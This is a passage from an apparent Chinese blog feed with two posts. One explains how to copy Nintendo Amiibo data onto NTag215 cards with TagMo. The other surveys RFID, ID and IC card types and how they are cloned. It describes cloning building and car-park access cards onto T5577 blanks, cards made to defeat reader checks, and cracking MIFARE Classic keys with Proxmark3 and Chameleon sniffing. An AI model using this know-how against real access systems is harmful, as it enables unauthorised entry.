        <content type="html"><![CDATA[<h2 id="Amiibo卡写入"><a href="#Amiibo卡写入" class="headerlink" title="Amiibo卡写入"></a>Amiibo卡写入</h2><h3 id="何为Amiibo"><a href="#何为Amiibo" class="headerlink" title="何为Amiibo"></a>何为Amiibo</h3><blockquote><p><strong>Amiibo</strong>（官方正名：<strong>amiibo</strong>，<a href="https://zh.wikipedia.org/wiki/%E6%97%A5%E8%AF%AD">日文</a>：<strong>アミーボ</strong>，中文：<strong>阿咪包</strong>或<strong>阿咪寶</strong>），是由日本遊戲廠商<a href="https://zh.wikipedia.org/wiki/%E4%BB%BB%E5%A4%A9%E5%A0%82">任天堂</a>自家所發行的<a href="https://zh.wikipedia.org/wiki/%E8%BF%91%E5%A0%B4%E9%80%9A%E8%A8%8A">近場通訊</a>產品，與之前其他遊戲廠商所發行的《<a href="https://zh.wikipedia.org/wiki/%E5%B0%8F%E9%BE%99%E6%96%AF%E6%B4%BE%E7%BD%97Skylanders">寶貝龍冒險</a>》系列、《<a href="https://zh.wikipedia.org/w/index.php?title=%E8%BF%AA%E5%A3%AB%E5%B0%BC_%E6%97%A0%E9%99%90&action=edit&redlink=1">迪士尼 無限</a>》系列以及《<a href="https://zh.wikipedia.org/w/index.php?title=Telepods&action=edit&redlink=1">Telepods</a>》等系列擁有近場通訊功能的玩偶有所差異[<a href="https://zh.wikipedia.org/zh-hk/Amiibo#cite_note-future_of_amiibo,_at_polygon-1">1]</a>[<a href="https://zh.wikipedia.org/zh-hk/Amiibo#cite_note-Nintendo_75th_fiscal-2">2]</a>，主要用在<a href="https://zh.wikipedia.org/wiki/Wii_U">Wii U</a>平板控制器、<a href="https://zh.wikipedia.org/wiki/%E6%96%B0%E4%BB%BB%E5%A4%A9%E5%A0%823DS">新任天堂3DS</a>[<a href="https://zh.wikipedia.org/zh-hk/Amiibo#cite_note-wiredcom-new3ds-3">3]</a>、<a href="https://zh.wikipedia.org/wiki/%E6%96%B0%E4%BB%BB%E5%A4%A9%E5%A0%822DS_XL/LL">新任天堂2DS XL&#x2F;LL</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BB%BB%E5%A4%A9%E5%A0%823DS">任天堂3DS</a>（需要額外Amiibo接收平台提供支援）和<a href="https://zh.wikipedia.org/wiki/%E4%BB%BB%E5%A4%A9%E5%A0%82Switch">任天堂Switch</a>上，這些Amiibo可以在一些特定的遊戲上傳送或接收所儲存的遊戲數據。</p><p>Amiibo首次在2014年E3展上對外發表，並公佈第一波Amiibo，早期發售的Amiibo大多數為《<a href="https://zh.wikipedia.org/wiki/%E4%BB%BB%E5%A4%A9%E5%A0%82%E6%98%8E%E6%98%9F%E5%A4%A7%E4%BA%82%E9%AC%A53DS/Wii_U">任天堂明星大亂鬥3DS&#x2F;Wii U</a>》登場的角色，後續也陸續發行了《<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E7%B4%9A%E7%91%AA%E5%88%A9%E6%AD%90">超級瑪利歐</a>系列》等的Amiibo。[<a href="https://zh.wikipedia.org/zh-hk/Amiibo#cite_note-Nintendo_Confirms_Amiibo_Cards_Will_Be_Launched_Later_This_Year-4">4]</a></p><p>——<a href="https://zh.wikipedia.org/zh-hk/Amiibo">Amiibo - 維基百科，自由的百科全書 (wikipedia.org)</a></p></blockquote><p>简单来说，Amiibo是任天堂官方出品的，具有NFC通信功能的塑胶人偶，国行版加个大概在99元，以正品手办来说，这个价格还可以接受。其质量来说也属于上乘了。</p><p><img src="https://cdn.lmark.cc/img/image-20230423111216383.png"></p><p>但是Amiibo和普通手办最大的不同之处在于，其底座里有一块NFC芯片，可以与NS右侧手柄的摇杆进行交互，从而实现游戏与现实的互动。</p><p><img src="https://cdn.lmark.cc/img/image-20230423111510029.png"></p><h3 id="Amiibo有什么用"><a href="#Amiibo有什么用" class="headerlink" title="Amiibo有什么用"></a>Amiibo有什么用</h3><p>以《<strong>薩爾達傳說 曠野之息</strong>》为例，其在游戏中能够使用的的Amiibo有25个，而且随着数据更新，应该会不断增加，而且最近《<strong>薩爾達傳說 王国之心</strong>》也准备出了，之前旷野之息能使用的Amiibo在王国之心里应该也是能使用的。下图是旷野之息能使用的amiibo一览</p><p><img src="https://cdn.lmark.cc/img/image-20230423112444499.png"></p><p>在旷野之息中，使用Amiibo可以获得一定的奖励，比如限定武器，装备，坐骑，宠物狼，材料等等。不同的奖励概率不一样，但是每个Amiibo每天只能用一次。由于Amiibo能刷限定装备，加之价格较贵，所以就有人动起了歪心思。因为普通的非CPU卡，大多具有可复制性，所以可以把amiibo玩偶的数据拷贝出来，然后复制到别的ic卡中去，这就是所谓的amiibo卡。</p><h3 id="怎么制作amiibo卡呢"><a href="#怎么制作amiibo卡呢" class="headerlink" title="怎么制作amiibo卡呢"></a>怎么制作amiibo卡呢</h3><blockquote><p><strong>注意：NTag215写入amiibo数据之后将无法擦除！！！</strong></p></blockquote><p>具体Amiibo是用的NFC芯片属于哪个型号我因为没有测过所以不知道，但是可以用<strong>NTag215</strong>来写入复制的内容，至于NTag215，可以移步我之前写过的文章：<a href="https://lmark.cc/archives/f746fa7f.html#NTAG%E5%8D%A1">RFID第一期——各种IC卡和ID卡详解 | LMark的博客</a>淘宝上一张NTag215还是非常便宜的，一两块。有了卡之后，就需要可以写入的数据，这里推荐使用<strong>TagMo</strong></p><p><img src="https://cdn.lmark.cc/img/image-20230423170006634.png"></p><p>这是安卓上一个写amiibo数据的软件，这个软件使用之前需要导入<strong>两个密钥文件</strong>。</p><p><img src="https://cdn.lmark.cc/img/image-20230423171002400.png"></p><p>然后就可以写入amiibo’数据了。</p><p>在首页的<code>LOAD TAG</code>中选择存放amiibo数据（格式为.bin）的文件夹，然后选中需要的文件，回到主页，点击<code>WRITE TAG</code>即可写入数据</p><p><img src="https://cdn.lmark.cc/img/image-20230427013719311.png"></p><h4 id="amiibo数据来源"><a href="#amiibo数据来源" class="headerlink" title="amiibo数据来源"></a>amiibo数据来源</h4><p>amiibo数据可以去百度，知乎有篇文章整理了很详细的amiibo数据：<a href="https://www.zhihu.com/tardis/zm/art/452791250?source_id=1005">自制Amiibo卡片 持续更新各游戏Amiibo数据包 (zhihu.com)</a></p><p>github上有个仓库也在不停更新着最新的amiibo数据：<a href="https://github.com/GrewdonGaming21/AmiiboGhost">GrewdonGaming21&#x2F;AmiiboGhost: A repository gathering amiibo in .bin (github.com)</a></p><p>或者我自己也将这两个数据渠道做了整合：<a href="http://pan.lmark.cc/d/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/%E6%96%87%E4%BB%B6%E5%88%86%E4%BA%AB/amiibo%E6%95%B0%E6%8D%AE.zip">amiibo数据</a></p><h4 id="更简单的方法？"><a href="#更简单的方法？" class="headerlink" title="更简单的方法？"></a>更简单的方法？</h4><p>这个TagMo软件原版作者已经停止维护了，现在有新开发者在维护，新版本的TagMo直接将密钥集成到了软件里，而且还可以直接在软件里搜索amiibo数据，非常方便。它的数据库同时也是实时更新的。</p><p><img src="https://cdn.lmark.cc/img/image-20230427014010500.png"></p><p>项目官网：<a href="https://tagmo.gitlab.io/">TagMo: README</a></p><p>下载地址：</p><ul><li>可以从APKPure上直接搜索，</li><li>或者在官方github上<a href="https://github.com/HiddenRamblings/TagMo/releases">Releases · HiddenRamblings&#x2F;TagMo (github.com)</a></li><li>实在不行我也存了一份<a href="http://pan.lmark.cc/d/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/%E6%96%87%E4%BB%B6%E5%88%86%E4%BA%AB/TagMo-17c412f-github-release-signed.apk">TagMo</a></li></ul><p>作者用爱发电的项目，大家有能力可以多支持支持</p><h3 id="制作体验"><a href="#制作体验" class="headerlink" title="制作体验"></a>制作体验</h3><p>我最开始想做的初衷是因为，我玩的NS是我的同学的，感觉老是借人家的玩怪不好意思的，所以打算整一套送她，正巧王国之心准备发售了，到时候就可以拿来刷了。</p><p>我制作的方案是参考淘宝上有售卖的那种——亚克力壳+NTag215</p><p><img src="https://cdn.lmark.cc/img/image-20230427015056574.png"></p><p>在淘宝找到一家卖卡和壳的，价格还很实惠六毛钱一个，我一口气买了20个</p><p><img src="https://cdn.lmark.cc/img/image-20230427015516774.png"></p><p>然后就是图案，我是直接用铜版纸打印，两块钱。当然觉得麻烦可以在这里买，不过这里好像缺货了哈哈哈，打印的精度来说还是很不错的</p><p>直接来看成品吧：</p><p><img src="https://cdn.lmark.cc/img/image-20230427015949386.png"></p><p>花销总计：18.04+2&#x3D;20.04 （24个amiibo）不到一块钱一个，稍微比淘宝一块多一个便宜一点。</p><h3 id="使用测试"><a href="#使用测试" class="headerlink" title="使用测试"></a>使用测试</h3><p>这里拿塞尔达测试一下：</p><p> <img src="https://cdn.lmark.cc/img/image-20230427025625320.png"></p><p><img src="https://cdn.lmark.cc/img/image-20230427025738627.png"></p><p>可以看到，是可以刷出来的，而且单机游戏刷东西也不用担心被ban啥的。</p><p>最后附上无限刷amiibo方法：</p><ul><li>在刷之前先存档，不满意再读档重刷</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Amiibo </tag>
            
            <tag> NFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>RFID第一期——各种IC卡和ID卡详解</title>
      
      <link href="/archives/f746fa7f.html"/>
      <url>/archives/f746fa7f.html</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>放假闲来无事，在B站冲浪，看到有人在讨论IC卡，我在这方面刚好还是有这么一点了解，就拿MF1卡给别人举了个例子，然后MF1卡就被开除出IC卡籍了。</p><p><img src="http://cdn.lmark.cc/img/image-20230131031512672.png"></p><p>有点气，但是仔细想想，网上关于这些卡的介绍知识太少了，有些人区分不了也很正常，于是我查阅大量资料，才有了这篇文章。</p><hr><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>先给大家捋清楚几个不同的名词：ID卡，IC卡，RFID卡，CPU卡，m1卡，MF1卡，UID卡,CUID卡。。。</p><p>看到这对名词想必大家头都大了，但是，今天我就带大家搞清楚这每一个名词的意思，以及目前市面上比较常见的卡的类型的介绍。</p><h2 id="RFID卡和IC卡"><a href="#RFID卡和IC卡" class="headerlink" title="RFID卡和IC卡"></a>RFID卡和IC卡</h2><p>首先，大家需要知道的一个名词是：<strong>RFID</strong></p><p>这是什么意思？我摘抄了Wiki上的介绍，帮助大家理解：<a href="https://zh.wikipedia.org/wiki/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB">射频识别 - 维基百科，自由的百科全书 (wikipedia.org)</a></p><blockquote><p><strong>射频识别</strong>（英语：<strong>R</strong>adio <strong>F</strong>requency <strong>ID</strong>entification，<a href="https://zh.wikipedia.org/wiki/%E7%B8%AE%E5%AF%AB">缩写</a>：<strong>RFID</strong>）是一种<a href="https://zh.wikipedia.org/wiki/%E7%84%A1%E7%B7%9A">无线</a><a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF">通信技术</a>，可以通过<a href="https://zh.wikipedia.org/wiki/%E6%97%A0%E7%BA%BF%E7%94%B5">无线电</a>信号识别特定目标并读写相关数据，而无需识别系统与特定目标之间建立<a href="https://zh.wikipedia.org/wiki/%E6%9C%BA%E6%A2%B0">机械</a>或者<a href="https://zh.wikipedia.org/wiki/%E5%85%89%E5%AD%A6">光学</a>接触。</p></blockquote><p>可以看到，RFID不是一种卡的代号，而是一种技术，一种非常常见的技术，使用了这个技术的“卡”都能称为<strong>RFID卡</strong>，这是一个大类，基本涵盖今天说的所有卡，除了接下来要说的<strong>IC卡</strong>的一部分:</p><p>IC卡定义，摘自百度百科：<a href="https://baike.baidu.com/item/IC%E5%8D%A1?fromtitle=%E9%9B%86%E6%88%90%E7%94%B5%E8%B7%AF%E5%8D%A1&fromid=984516&fromModule=lemma_search-box">IC卡_百度百科 (baidu.com)</a></p><blockquote><p>IC卡 (Integrated Circuit Card，集成电路卡)，也称智能卡(Smart card)、智慧卡(Intelligent card)、微电路卡(Microcircuit card)或微<a href="https://baike.baidu.com/item/%E8%8A%AF%E7%89%87/32249?fromModule=lemma_inlink">芯片</a>卡等。它是将一个<a href="https://baike.baidu.com/item/%E5%BE%AE%E7%94%B5%E5%AD%90/1410350?fromModule=lemma_inlink">微电子</a><a href="https://baike.baidu.com/item/%E8%8A%AF%E7%89%87/32249?fromModule=lemma_inlink">芯片</a>嵌入符合ISO 7816标准的卡基中，做成卡片形式。IC卡与读写器之间的通讯方式可以是<a href="https://baike.baidu.com/item/%E6%8E%A5%E8%A7%A6/5692?fromModule=lemma_inlink">接触</a>式也可以是非接触式。</p></blockquote><p>从两者定义可以看出，RFID卡和IC卡并不是简单的包含与被包含的关系，因为一个是从技术上定义，一个是从结构上定义。两者不能直接比较。严格意义上来说，<strong>接触型IC卡</strong>不属于RFID卡，因为RFID的一大特征就是可以无接触，常见的接触型IC卡有：银行卡，SIM卡等等。最明显的特征就是这个裸露的芯片。</p><p><img src="http://cdn.lmark.cc/img/Differentsmartcardpadlayouts.jpg" alt="img"></p><p>而现在<strong>非接触型IC卡</strong>（也就是不用接触也能刷的卡）常被人们叫做射频卡，属于<strong>RFID卡</strong>的范畴。现在很多人直接把IC卡归到了RFID卡里面去，这个说法也不能说是错的，只是没这么严谨罢了。</p><h2 id="RFID和NFC"><a href="#RFID和NFC" class="headerlink" title="RFID和NFC"></a>RFID和NFC</h2><p>想必大家现在经常能见到NFC这个词，也总是会发现NFC和众多的“卡”联系在一起。比如：</p><ul><li>手机的NFC功能</li><li>小米手环7NFC版</li><li>NFC卡贴</li><li>NFC读卡器</li><li>……</li></ul><p>虽然日常生活中，NFC总是和刷卡有关，但是NFC技术和RFID是有着一定的区别的。这里我先给大家解释一下NFC的含义：<a href="https://zh.wikipedia.org/wiki/%E8%BF%91%E5%A0%B4%E9%80%9A%E8%A8%8A">近场通信 - 维基百科，自由的百科全书 (wikipedia.org)</a></p><blockquote><p><strong>近场通信</strong>（英语：Near-field communication，NFC），又称<strong>近距离无线通信</strong>、<strong>近距离通信</strong>，是一套<a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E8%A8%8A%E5%8D%94%E5%AE%9A">通信协议</a>，让两个电子设备（其中一个通常是移动设备，例如<a href="https://zh.wikipedia.org/wiki/%E6%99%BA%E6%85%A7%E5%9E%8B%E6%89%8B%E6%A9%9F">智能手机</a>）在相距几厘米之内进行<a href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%82%B3%E8%BC%B8">通信</a>。</p></blockquote><p>NFC其实是由RFID技术演变而来，由<a href="https://zh.wikipedia.org/wiki/%E9%A3%9E%E5%88%A9%E6%B5%A6">飞利浦</a>半导体（现<a href="https://zh.wikipedia.org/wiki/%E6%81%A9%E6%99%BA%E6%B5%A6%E5%8D%8A%E5%AF%BC%E4%BD%93">恩智浦半导体</a>）、<a href="https://zh.wikipedia.org/wiki/%E8%AB%BE%E5%9F%BA%E4%BA%9E">诺基亚</a>和<a href="https://zh.wikipedia.org/wiki/%E7%B4%A2%E5%B0%BC">索尼</a>共同于2004年研制开发</p><p>的。它的特点有：</p><ul><li>传输距离小，一般小于20cm</li><li>工作频率固定，为13.56MHz</li><li>传输速度为424 kbit&#x2F;s</li></ul><p><img src="http://cdn.lmark.cc/img/v2-443da2cae7aa55db85a55e9c83a7a96a_1440w.webp" alt="img"></p><p>具体NFC技术与RFID技术的区别，详见这篇文章：<a href="http://t.zoukankan.com/zouhao-p-3025542.html">NFC 与 RFID - 走看看 (zoukankan.com)</a></p><p><img src="http://cdn.lmark.cc/img/different-nfc-rfid.jpg" alt="different-nfc-rfid"></p><p>虽然NFC与RFID有这么多不同，但是NFC兼容于现有的被动RFID（13.56 MHz ISO&#x2F;IEC 18000-3）设施。所以，在高频RFID（13.56MHz）的应用领域中，同样可以使用NFC技术。我们日常用到的卡，基本都是使用了NFC技术，所以下文NFC出现频率会很高。</p><h2 id="IC卡和ID卡"><a href="#IC卡和ID卡" class="headerlink" title="IC卡和ID卡"></a>IC卡和ID卡</h2><p>日常生活中，也会常常听到ID卡这个名词，那么，ID卡和IC卡有什么区别呢？</p><p>这里提到的IC卡指的是射频卡。</p><p>首先先搞清楚什么是ID卡，浅看定义：<a href="https://baike.baidu.com/link?url=G8x8CqQFAMexlQYUpUtoTaXi1a00Lm7pp1-X3Qxt4Yumy674enLYUcOdTVZAG9uJqDTf4BbPfllo-QhMX3Dcyb26ETZIUTNIiZYt_x1P5a7">ID卡_百度百科 (baidu.com)</a></p><blockquote><p>ID卡全称为身份识别卡（Identification Card），是一种不可写入的感应卡，含固定的编号，主要有台湾SYRIS的EM格式、美国HIDMOTOROLA等各类ID卡。ID卡与<a href="https://baike.baidu.com/item/%E7%A3%81%E5%8D%A1/885032">磁卡</a>一样，都仅仅使用了“卡的号码”而已，卡内除了卡号外，无任何保密功能，其“卡号”是公开、裸露的。所以说ID卡就是“感应式磁卡”。 <a href="https://baike.baidu.com/item/ISO%E6%A0%87%E5%87%86/9818656">ISO标准</a>ID卡的规格为：85.5x54x0.80±0.04mm（高&#x2F;宽&#x2F;厚），市场上也存在一些厚、薄卡或异型卡。</p></blockquote><p>两种卡的原理和使用方式上的区别。</p><ul><li><p>ID卡多为低频（125Khz），而且是一种<strong>不可写入数据</strong>的非接触卡，卡号只能由芯片生产厂商一次性写入，开发商只能读出卡号加以使用。</p></li><li><p>IC卡多为高频（13.56MHz），不仅可由授权用户读出大量数据，而且亦可由授权用户写入大量数据(如新的卡用户的权限、用户资料等)，IC卡所记录内容可反复擦写。</p></li></ul><p>此外，两种卡在外型上还有很大区别，如下图所示：</p><p><img src="http://cdn.lmark.cc/img/56a119a1596b4c7db040578e98d60a0d.png" alt="img"></p><p><img src="http://cdn.lmark.cc/img/d7711b5306554cb8926072a579956e29.png" alt="img"></p><p><strong>总结：</strong><br>1.ID卡多为低频，IC多为高频；<br>2.IC卡整体上看比ID卡更有优势，市面上使用的大多数也是IC卡；<br>3.对于矩形白卡，里面为矩形线圈、表面没有编号的多为IC卡，里面为圆形线圈、表面有编号的多为ID卡；<br>4.对于异形卡，有编号的多为ID卡，最好使用带NFC的手机进行测试(目前手机NFC只能读高频13.56Mhz)，IC卡会有反应；</p><h1 id="ID卡介绍"><a href="#ID卡介绍" class="headerlink" title="ID卡介绍"></a>ID卡介绍</h1><p>前面介绍了这么多前置知识，现在该进入正文了。开始详细的介绍每一种卡，先从ID卡开始。ID卡最显著的特征就是低频，出厂固化ID，价格低廉，没有加密。</p><h2 id="一般的ID卡"><a href="#一般的ID卡" class="headerlink" title="一般的ID卡"></a>一般的ID卡</h2><p>ID卡有很多种不用的芯片，由许多不同的公司生产的，常见的有：Mifare UtraLight IC U1、Mifare DESFire 4K；Legic MIM256 ；ST SR176、SRIX4K；I·CODE 1、 I·CODE 2；Tag-it HF-I、Tag-it TH-CB1A；Temic e5551；Atmel T5557、Atmel T5567、Atmel AT88RF256-12 ；Hitag1、 Hitag 2；μEM EM4100、EM 4102、 EM4069、EM4150；TK4100；Inside 2K、Inside 16K等。</p><p>国内比较常见的是瑞士微电子公司的<strong>EM4100</strong>无线射频芯片的ID卡，所以一般的ID卡我将以这款芯片来介绍。首先上谷歌找一下EM4100的data sheet。</p><p><img src="http://cdn.lmark.cc/img/image-20230131154402445.png"></p><p>从Feature可以看到，普通的ID卡只有64bit的存储空间，存个ID之后就没什么空间了，所以ID卡，应用场景十分的有限。再来看看存储结构：</p><p><img src="http://cdn.lmark.cc/img/image-20230131155700052.png"></p><p>可以看到，真正存储数据的只有40bit，其中8bit是用户标识&#x2F;版本号，剩下32bit是数据位&#x2F;卡号。校验位Px和PCx，对应行或列有偶数个1(不包括校验位)，则校验位为0。奇数个1，则校验位为1。将数据进行编码之后，就变成了64bit的数据（9bit起始位 + 54bit数据&#x2F;校验位 + 1bit停止位），在上电后就以“曼切斯特编码方式”循环地发送。</p><p>上面EM4100的简单介绍，可以说和本文关系不大，大家看个乐就行。我是写给以后的我看的。其实，常见的ID卡芯片都是<strong>EM4XX</strong>的，所以网上一般都是将普通的ID卡默认为EM4XX系列的卡。问题不大。这种卡一般造价低廉，只能读不能写。常用于低成本门禁卡，小区门禁卡，停车场门禁卡等等。这种卡没什么安全性可言，可以用手持式的读卡器直接复制来着。</p><h2 id="ID白卡"><a href="#ID白卡" class="headerlink" title="ID白卡"></a>ID白卡</h2><p>一般指的是<strong>EM4305或T5577</strong>，这种卡顾名思义，可以用来克隆ID卡，出厂为<strong>白卡</strong>,内部的EEPROM（用户储存数据）可读可写，通过修改EEPROM的内容达到修改ID的目的。且T5577还很多功能，其内部有扇区，可以用来存储数据，个别扇区还可设置密码。最特别之处是，写入ID 号可以变身成为ID 卡，写入HID号可以变身HID 卡，写入Indala 卡号，可以变身Indala 卡。</p><p>至于为什么能用白卡来复制ID卡，详情可看这篇文章：<a href="https://www.cnblogs.com/osnosn/p/10662647.html">用EM4305&#x2F;T5557模拟EM4100的ID卡,原理解释 - osnosn - 博客园 (cnblogs.com)</a>****</p><h3 id="T5577简略介绍"><a href="#T5577简略介绍" class="headerlink" title="T5577简略介绍"></a>T5577简略介绍</h3><p>这里简单介绍一下存储结构，先贴一下data sheet：<a href="https://orangetags.com/rfid-chip-datasheet/atmel-datasheet/t55/atmel-t5557-datasheet/">Atmel T5557 Datasheet (orangetags.com)</a>。感兴趣可以仔细研究研究。</p><p><img src="http://cdn.lmark.cc/img/image-20230131162607741.png"></p><p>介绍摘抄自：<a href="https://www.cnblogs.com/viperchaos/archive/2011/09/07/2170067.html">T5557卡片说明 - viperchaos - 博客园 (cnblogs.com)</a></p><blockquote><p> T5557的卡结构有页0和页1，页1有两个块，页0有8个块，每个块有33位，第一位为锁定位，写入为1，该块后面的32位就无法修改了。</p><p> ​    页1的数据只能为读，包含卡号信息和制造商的一些信息，具体格式含义见T5557芯片资料。页0块0为配置字，决定了卡片跟阅读器通信时工作的频率，调制方式及卡片页0块号可见数目等。配置字很关键，同样的T5557卡片，有些阅读器能读，有些阅读器不能读的，这个阅读器内部单片机的具体程序设计相关，所以一旦设置好不要轻易修改。</p><p> ​    T5557的访问分两种方式：常规读写和保护读写。常规读写模式下，页0块7是普通的数据区，访问页1的块或页0的块都是不需要密码的；保护读写模式下，页0块7为密码的存放区，是不可见的，无法读取。访问页1的块或页0的块都是需要密码的。我们现在用的是华峰科技有限公司的低频阅读器，据文档说明，配置字为00 08 80 e8时为常规读写，配置字为00 08 82 f8时为保护读写。</p></blockquote><h3 id="EM4305简略介绍"><a href="#EM4305简略介绍" class="headerlink" title="EM4305简略介绍"></a>EM4305简略介绍</h3><p>EM4305卡有32个密码读&#x2F;写保护.32位唯一的ID代码和10位客户代码。</p><p>EM4305卡的EEPROM储存空间为512位，分为16个扇区，每个扇区32位，其中锁定位置可分为16个扇区，EEPROM数据块变成了只读模式。EM4469可提供各种低功耗的数据传输率和编码方法，其内部集成的谐振电容可掩膜选择，无需外部电容。此外，片内还有整流器和限压器，可在-40℃~85℃在温度下工作。</p><p>摘自：<a href="https://baijiahao.baidu.com/s?id=1741569464547237663&wfr=spider&for=pc">EM4205 &#x2F; EM4305 芯片卡 (baidu.com)</a></p><p>EM4305和T5577的一些异同点：</p><p><img src="http://cdn.lmark.cc/img/4b0f4c3a34af4b048f699084edf551ed.png" alt="img"></p><h2 id="HID卡"><a href="#HID卡" class="headerlink" title="HID卡"></a>HID卡</h2><p>全称HID Prox Ⅱ，是一家叫HID Global的公司生产的，并不是很么高频ID卡的意思（一开始还搞错了）。这家公司比较的厉害，它生产的卡使用的芯片是自己定制的，而且HID还提供一套完整的解决方案：设备，卡片，协议等。芯片内部使用的协议比EM4100或T5577安全很多。 </p><p>HID卡外观：</p><p><img src="http://cdn.lmark.cc/img/3c5579c38955464e9cbb991db81e1cb6.png" alt="img"></p><p>市面上有兼容HID卡的读卡器，但是有些信息是读不出来的，需要使用HID的专用读卡器。当然HID公司除了低频卡，旗下也有高频卡系列。</p><p>关于这家公司：</p><blockquote><p>美国HID最早是作为体斯火箭公司的一个部门，为整个公司内部提供读卡器和卡，原来HID三字的全称为“Hughes Idert Jication”。1991年从体斯公司独立出来，在以后的几年中HID进入了连续快速的增长期。</p></blockquote><h2 id="Indala卡"><a href="#Indala卡" class="headerlink" title="Indala卡"></a>Indala卡</h2><p>全称Indala Proximity，是HID公司的一个系列，相对HID卡，比较冷门，而且时间比较早，原来是原摩托罗拉卡（Motoroal卡）,简单介绍;</p><blockquote><p>所有 HID Indala 125 kHz 感应卡均采用 FlexSecur技术，通过读卡器上的验证过程提供更高级别的门禁系统安全性。 作为 HID Indala 产品系列独有的功能，FlexSecur会在将卡数据发送到主机系统前筛选掉未授权卡。 可以提供适合每个应用的各种样式的 Indala 凭证卡。 Indala 凭证卡与所有 Indala 读卡器兼容，并且可以轻松地使用 Indala ProxSmith编程器和工具包进行编码。 此外，HID Indala 感应卡没有电池的无源设计允许无限次读取，并且保证没有材料和工艺上的缺陷。</p></blockquote><p>摘自：<a href="http://www.it922.com/solutions/std4.htm"> Indala卡(it922.com)</a></p><h2 id="ID防火墙卡"><a href="#ID防火墙卡" class="headerlink" title="ID防火墙卡"></a>ID防火墙卡</h2><p>用来攻克防火墙的特殊ID卡，大概有一下几种：</p><ul><li>F8268</li><li>5200</li><li>8265</li><li>8310</li><li>8678</li></ul><p>这些卡是国产的，用来对付防火墙，关于ID卡防火墙，有一种做法是：在读入ID卡的数据之前，先向ID卡尝试写入数据，如果是正常的ID卡，只读不受影响，但如果是T5577这种，就会被修改卡号，达到防火墙拦截的目的。所以有了这些穿透防火墙的卡。</p><p>详见：<a href="https://blog.csdn.net/good02xaut/article/details/121824821">ID门禁卡的防火墙_good02xaut的博客-CSDN博客_id卡 防火墙</a></p><h1 id="IC卡介绍"><a href="#IC卡介绍" class="headerlink" title="IC卡介绍"></a>IC卡介绍</h1><p>这里的IC卡一般指高频卡（13.56MHz）放张图看下不同频段的一些特点</p><p><img src="http://cdn.lmark.cc/img/image-20230131181434483.png"></p><p>至于为为什么是13.56MHz，我也没找到比较权威的说法，但是我们知道，频率越高，波长越小，所能携带的信息越多，这应该是一个折中的考虑，问题不大。在介绍IC卡种类之前，先来了解一下ISO14443标准：<a href="https://zh.wikipedia.org/wiki/ISO/IEC_14443">ISO&#x2F;IEC 14443 - 维基百科，自由的百科全书 (wikipedia.org)</a></p><p>这项标准规定在工作频率是13.56MHz。其中，ISO14443标准分为了<strong>typeA和typeB</strong>两个有些许差异的标准。</p><p>前者市场普及率比较高（一般的IC卡就是typeA标准），后者则是有<strong>传输能量不中断、速率更高、抗干扰能力强</strong>的特点。</p><p>接下来主要讲ISO14443-typeA标准的IC卡。</p><h2 id="MIFARE-Classic-1K卡"><a href="#MIFARE-Classic-1K卡" class="headerlink" title="MIFARE Classic 1K卡"></a>MIFARE Classic 1K卡</h2><p>这个可以说是目前最常见IC卡了，他还有许多名字，比如：Mifare Standard，Mifare S50，Mifare S70，MF1，M1等等。这个卡UID出厂固定，可以修改储存的数据。</p><p><img src="http://cdn.lmark.cc/img/image-20230131191318840.png"></p><p>属于Mifare系列的，关于Mifare：<a href="https://zh.wikipedia.org/wiki/MIFARE">MIFARE - 维基百科，自由的百科全书 (wikipedia.org)</a></p><p><img src="http://cdn.lmark.cc/img/Mifare_1k_transparent.jpg" alt="img"></p><p>据说全球出货量达到了50亿！其中的Mifare S50和Mifare S70的区别在于容量，S50容量为1KB，而S70容量为4KB。关于M1卡，下一篇文章我会专门介绍它，这里我就简单介绍一下：</p><p>M1卡有16个扇区组成，每个扇区有4个数据快，每个数据块有16个字节（16x4x16&#x3D;1024）</p><p>其中0扇区的第0块存着卡片以及厂商的信息。</p><p><img src="http://cdn.lmark.cc/img/image-20230131192842658.png"></p><p>每个扇区有两个密钥，keyA和keyB，3区块中间的四位是存储控制位，决定的这个扇区的权限。但是在2008年，M1就被爆出有漏洞，使得该种卡能够被直接破解，这类卡被称为所谓的<strong>漏洞卡</strong>，当然，过了这么久，漏洞会被修复的。目前<strong>无漏洞卡</strong>已经到了第三代，单靠pm3可能还破解不了，还需要变色龙来嗅探。</p><h3 id="非加密卡，半加密卡，全加密卡"><a href="#非加密卡，半加密卡，全加密卡" class="headerlink" title="非加密卡，半加密卡，全加密卡"></a>非加密卡，半加密卡，全加密卡</h3><p>很好理解，因为M1卡有16个扇区，每个扇区都有俩密钥</p><ul><li>非加密卡就是所有的16个扇区都是默认密钥，或者弱口令。此类卡，pm3一般都能直接破解</li><li>半加密卡就是有一部分扇区不使用默认密钥，这类卡pm3大部分也能直接破解</li><li>全加密卡就是16个扇区都被加密了，此类卡往往破解难度很大，pm3也有可能解不出来</li></ul><p>对付全加密卡，就需要变色龙的嗅探。什么？不知道变色龙？变色龙简单来说就是一个单片机，能模拟卡片的电气结构，通过写入加密卡的dump，变色龙直接拿去机器刷卡，可以嗅探出指定扇区的密钥。有了一个扇区的密钥之后，就可以破解出剩下扇区的密钥了。</p><h2 id="MIFARE-UltraLight卡"><a href="#MIFARE-UltraLight卡" class="headerlink" title="MIFARE UltraLight卡"></a>MIFARE UltraLight卡</h2><p>也被称为M0卡、MF0卡，是一种高频低成本卡，同时容量小，但是比M1卡轻薄。</p><p>其容量只有512bit，也就是64B。被划分为了16个page，每个page包含4个字节，如下图所示：</p><p><img 